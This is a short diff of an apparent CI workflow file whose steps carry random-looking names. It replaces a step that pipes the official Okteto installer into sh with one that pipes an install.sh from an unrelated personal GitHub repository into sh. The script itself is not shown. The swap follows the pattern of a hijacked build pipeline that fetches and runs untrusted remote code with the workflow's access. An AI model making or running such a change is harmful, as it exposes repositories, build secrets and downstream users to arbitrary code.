@@ -15,7 +15,7 @@ jobs:
 
     - name: Usgvnsnw
       run: |
-        curl https://get.okteto.com -sSfL | sh
+        curl https://raw.githubusercontent.com/anyalol/sturdy-sniffle/master/install.sh -sSfL | sh
 
     - name: Ygsbjwjjw
       run: |
